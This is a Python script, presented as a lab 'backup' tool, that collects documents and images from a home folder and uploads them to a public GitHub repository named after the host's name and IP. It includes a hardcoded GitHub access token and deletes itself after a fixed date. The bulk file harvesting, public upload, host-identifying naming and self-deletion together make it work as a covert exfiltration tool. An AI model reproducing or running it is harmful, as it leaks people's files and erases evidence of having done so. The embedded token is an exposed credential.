import os
import sys
import socket
import base64
import requests
import time
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ---------------- AUTO-DELETE CONFIG ----------------
DELETE_DATE = "2026-03-01"  # YYYY-MM-DD

def check_auto_delete():
    today = datetime.today().date()
    delete_day = datetime.strptime(DELETE_DATE, "%Y-%m-%d").date()
    if today >= delete_day:
        script_path = os.path.realpath(__file__)
        try:
            os.remove(script_path)
            print(f"[INFO] Script deleted automatically as of {DELETE_DATE}.")
        except Exception as e:
            print(f"[ERROR] Could not delete script: {e}")
        sys.exit()

# Run the auto-delete check first
check_auto_delete()

# ---------------- CONFIG ----------------
GITHUB_USERNAME = "kailesh-waran-13"
GITHUB_TOKEN = "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"  # Replace with your lab token
BRANCH = "main"
FILE_TYPES = {
    "PDFs": ['.pdf'],
    "DOCX": ['.docx'],
    "TEXT": ['.txt'],
    "Images": ['.png', '.jpg', '.jpeg']
}
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100 MB
MAX_RETRIES = 3
RETRY_DELAY = 5
SCAN_FOLDERS = [os.path.expanduser("~/LabFiles")]  # Only scan lab files
STATE_FILE = "uploaded_files.json"  # Tracks uploaded files
MAX_THREADS = 5  # Number of concurrent uploads

# ---------------- SYSTEM INFO ----------------
hostname = socket.gethostname()
try:
    ip_address = socket.gethostbyname(hostname)
except:
    ip_address = "UnknownIP"
safe_ip = ip_address.replace(".", "_")
repo_name = f"{hostname}_{safe_ip}_Backup"

# ---------------- HELPER FUNCTIONS ----------------
def load_state():
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, "r") as f:
            return set(json.load(f))
    return set()

def save_state(uploaded_files):
    with open(STATE_FILE, "w") as f:
        json.dump(list(uploaded_files), f, indent=2)

def is_network_connected(host="8.8.8.8", port=53, timeout=3):
    try:
        socket.setdefaulttimeout(timeout)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
        return True
    except:
        return False

def wait_for_network():
    while not is_network_connected():
        print("[WAIT] Network disconnected. Retrying in 5 seconds...")
        time.sleep(5)

def create_repo_if_not_exists(token, repo_name):
    url = f"https://api.github.com/repos/{GITHUB_USERNAME}/{repo_name}"
    resp = requests.get(url, auth=(GITHUB_USERNAME, token))
    if resp.status_code == 404:
        url_create = "https://api.github.com/user/repos"
        data = {"name": repo_name, "private": False, "auto_init": True}
        headers = {"Authorization": f"token {token}"}
        resp_create = requests.post(url_create, json=data, headers=headers)
        if resp_create.status_code == 201:
            print(f"[+] Repository '{repo_name}' created successfully!")
        else:
            print(f"[!] Failed to create repo '{repo_name}': {resp_create.status_code}")
    else:
        print(f"[INFO] Using existing repository: {repo_name}")

def get_existing_files(username, token, repo, folder=""):
    url = f"https://api.github.com/repos/{username}/{repo}/contents/{folder}" if folder else f"https://api.github.com/repos/{username}/{repo}/contents"
    resp = requests.get(url, auth=(username, token))
    existing = set()
    if resp.status_code == 200:
        for item in resp.json():
            if item["type"] == "file":
                existing.add(item["name"])
    return existing

def handle_rate_limit(resp):
    if resp.status_code == 403:
        reset_time = int(resp.headers.get("X-RateLimit-Reset", time.time() + 60))
        wait_seconds = max(reset_time - int(time.time()), 1)
        print(f"[RATE LIMIT] Hit GitHub API limit. Waiting {wait_seconds} seconds...")
        time.sleep(wait_seconds)
        return True
    return False

def upload_file(username, token, repo, branch, folder, filepath, existing_files, uploaded_files):
    filename = os.path.basename(filepath)
    
    if filename in existing_files or filepath in uploaded_files:
        print(f"[SKIP] {filename} already uploaded")
        return "Skipped"
    
    if os.path.getsize(filepath) > MAX_FILE_SIZE:
        print(f"[SKIP] {filename} too large")
        return "Skipped"
    
    with open(filepath, "rb") as f:
        content = base64.b64encode(f.read()).decode()
    
    url = f"https://api.github.com/repos/{username}/{repo}/contents/{folder}/{filename}"
    data = {"message": f"Add {filename}", "content": content, "branch": branch}
    
    for attempt in range(1, MAX_RETRIES + 1):
        wait_for_network()
        resp = requests.put(url, json=data, auth=(username, token))
        if resp.status_code in [200, 201]:
            print(f"[UPLOAD] {filename}")
            uploaded_files.add(filepath)
            save_state(uploaded_files)
            return "Uploaded"
        elif handle_rate_limit(resp):
            continue
        else:
            print(f"[FAIL] {filename} | Attempt {attempt} failed | Status: {resp.status_code}")
            if attempt < MAX_RETRIES:
                time.sleep(RETRY_DELAY)
            else:
                return f"Failed ({resp.status_code})"

def scan_files():
    files_dict = {key: [] for key in FILE_TYPES}
    for base_folder in SCAN_FOLDERS:
        for root, dirs, files in os.walk(base_folder):
            for file in files:
                filepath = os.path.join(root, file)
                for category, exts in FILE_TYPES.items():
                    if any(file.lower().endswith(ext) for ext in exts):
                        files_dict[category].append(filepath)
    return files_dict

def threaded_upload(category, file_list, existing_files, uploaded_files):
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for fpath in file_list:
            futures.append(executor.submit(upload_file, GITHUB_USERNAME, GITHUB_TOKEN, repo_name, BRANCH, category, fpath, existing_files, uploaded_files))
        for future in as_completed(futures):
            future.result()  # Wait for completion

# ---------------- MAIN ----------------
def main():
    uploaded_files = load_state()
    create_repo_if_not_exists(GITHUB_TOKEN, repo_name)
    files_to_upload = scan_files()
    
    for category, file_list in files_to_upload.items():
        existing_files = get_existing_files(GITHUB_USERNAME, GITHUB_TOKEN, repo_name, category)
        threaded_upload(category, file_list, existing_files, uploaded_files)
    
    print("[INFO] All files processed successfully.")

if __name__ == "__main__":
    main()



